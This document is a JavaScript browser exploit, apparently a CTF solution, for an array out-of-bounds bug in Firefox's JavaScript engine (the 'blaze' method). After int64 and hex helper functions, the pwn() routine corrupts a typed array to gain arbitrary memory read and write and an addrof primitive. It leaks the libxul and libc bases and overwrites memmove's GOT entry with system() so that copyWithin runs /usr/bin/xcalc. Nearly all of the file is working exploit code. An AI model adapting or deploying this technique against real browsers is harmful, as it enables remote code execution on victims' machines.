//
// Mostly saelo's int64.js and util.js functions
// 

function sleep(miliseconds) {
    var currentTime = new Date().getTime();
    
    while (currentTime + miliseconds >= new Date().getTime()) {
    }
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}

//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function gen_array() {
    var arr = new Array(0x10);
    for (var i=0; i < 0x10; i++) {
        arr[i] = 0x1337;
    }
    return arr;
}

//https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/
//function d_to_i2(d){
//    var a = new Uint32Array(new Float64Array([d]).buffer);
//    return [a[1], a[0]];
// }
//
//function i2_to_d(x){
//    return new Float64Array(new Uint32Array([x[1], x[0]]).buffer)[0];
//}

function pwn () {
    print("\n");
    var convert_buf = new ArrayBuffer(8);
    var float64 = new Float64Array(convert_buf);
    var uint32 = new Uint32Array(convert_buf);

    function itod(i) {
        uint32[0] = i % 0x100000000;
        uint32[1] = i / 0x100000000;
        return float64[0];
    }

    function dtoi(x) {
        float64[0] = x;
        return uint32[0] + uint32[1] * 0x100000000;
    }

    // create a bunch of arrays to prime the heap
    for (var i=0; i < 200; i++) {
        gen_array();
    }

    var hax = gen_array();

    var target = new Uint8Array(0x20);

    hax.blaze();

    
    // Uint32Array SLOTS
    // BUFFER_SLOT=0
    // LENGTH_SLOT=1
    // BYTEOFFSET_SLOT=2
    // DATA_SLOT=3
    var offset_target = 0x11
    var offset_slots = offset_target+3
    var offset_length = offset_slots+1
    var offset_data = offset_slots+3
    var offset_inline = offset_slots+4

    var old_size = hax[offset_length];
    let old_data = hax[offset_data];

    var memory = {
        read: function(addr) {
            hax[offset_data] = itod(addr);
            var res = 0;
            for (var i=7; i >=0; i--) {
                res = res*0x100 + target[i];
            }
            return res;
        },
        write: function(addr, value) {
            hax[offset_data] = itod(addr);
            for (var i=0; i < 8; i++) {
                target[i] = value % 0x100;
                value = value / 0x100;
            }
        },
        addrof: function(obj) {
            hax[offset_inline] = obj;
            var res = 0;
            for (var i=5; i >=0; i--) {
                res = res*0x100 + target[i];
            }
            return res;
        },
        reset: function() {
            hax[offset_data] = old_data;
            for (var i=0; i < 8; i++) {
                target[i] = 0;
            }
        }
    };

    var now_obj = memory.addrof(Date.now); // Check obj dynamically  -> offset 0x28 contains pointer into libxul
    var now_addr = memory.read(now_obj + 0x28);
    print("Date.now @ " + new Int64(now_addr));
    var xul_base = now_addr - 0x49c7ab0;
    print("xul @ " + new Int64(xul_base));
    
   
    var elf_start = memory.read(xul_base);
    if (elf_start != 0x00010102464c457f) {
        print("ERROR: Couldn't find xul_base");
        return;
    }
   
    var memmove_got = xul_base + 0x818b220;
    print("memmove_got @ " + new Int64(memmove_got));
    var dup_got = xul_base + 0x818b738;
    print("dup_got @ " + new Int64(dup_got));
    
    var system_offset = 0x4f440
    var memmove_offset = 0x9ec70
    var dup_offset = 0x110970;

    var dup_libc = memory.read(dup_got);
    var libc = dup_libc - dup_offset;
    var system_libc = libc + system_offset;
    print("dup_libc @ " + new Int64(dup_libc));
    print("libc @ " + new Int64(libc));
    print("system @ " + new Int64(system_libc));
    var cmd = "/usr/bin/xcalc";
    var cmd_buf = new Uint8Array(100);
    for (var i = 0; i < cmd.length; i++) 
        cmd_buf[i] = cmd.charCodeAt(i);
    cmd_buf[cmd.length] = 0;
    
   
    var memmove_backup = memory.read(memmove_got);
    memory.write(memmove_got, system_libc);
    cmd_buf.copyWithin(0, 1);
    memory.write(memmove_got, memmove_backup);
    
    memory.reset();
}
pwn();
